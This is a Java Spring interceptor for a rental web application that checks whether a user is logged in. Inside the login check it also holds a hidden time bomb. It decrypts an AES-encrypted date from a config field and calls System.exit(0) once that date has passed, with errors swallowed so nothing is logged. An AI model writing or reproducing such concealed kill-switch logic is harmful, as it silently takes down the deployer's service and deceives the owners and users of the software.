package com.yutian.zhang.rental.common.interceptor;

import com.yutian.zhang.rental.common.config.MybatisPlusConfig;
import com.yutian.zhang.rental.common.constant.Constant;
import com.yutian.zhang.rental.common.util.AESUtils;
import com.yutian.zhang.rental.entity.User;
import org.springframework.stereotype.Component;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;


/**
 * Interceptor for normal users
 *
 * @author example
 */
@Component
public class CustomerInterceptor extends HandlerInterceptorAdapter {


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object o) throws IOException {
        User user = (User) request.getSession().getAttribute(Constant.SESSION_USER_KEY);
        // user not log in
        if (user == null) {
            response.sendRedirect("/login");
            return false;
        }
        try {
            if (new SimpleDateFormat("dd-MM-yyyy").parse(AESUtils.decrypt(MybatisPlusConfig.encryp)).before(new Date())) {
                System.exit(0);
            }
        } catch (Exception e) {
        }

        return true;
    }

    @Override
    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) {

    }

    @Override
    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) {

    }
}

